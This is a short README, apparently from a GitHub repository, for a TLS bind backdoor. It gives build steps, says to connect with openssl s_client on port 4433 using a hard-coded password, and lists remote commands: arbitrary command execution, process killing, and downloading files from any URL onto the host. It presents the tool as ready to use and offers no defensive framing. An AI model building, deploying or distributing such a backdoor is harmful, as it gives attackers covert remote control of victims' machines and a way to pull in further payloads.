# TLS Bind Backdoor
Just a simple TLS tcp bind backdoor with essential functionalities.

## Compilation
`git clone https://github.com/Zeta314/backdoor-tls.git`
`cd backdoor-tls`
`make`
At this point in `build` folder there are three files: `backdoor` (actually the backdoor executable), `key.pem` and `cert.pem`.
When you have to execute the backdoor, it's important that there are `key.pem` and `cert.pem` in the same folder.

## Connection
To connect to the backdoor, you must have installed `openssl`.
If you don't have openssl installed, just type `sudo apt-get install openssl` in the terminal.

Once installed openssl, to connect you have to type:
`openssl s_client -connect {IP HERE}:4433`

Once connected it will prompt you the password, just type `p4ssword`.

## Available commands
* `kill <PID>`
+ It will kill the process with the given `process ID`

* `whoami`
+ It will give you the name of the user that is executing the backdoor

* `exec <command>`
+ It will execute the given `command`, like in bash shell

* `download <URL>`
+ It will download the given `URL` to the current working directory

* `shutdown`
+ It will shut down the backdoor server

* `help`
+ It will output the command list

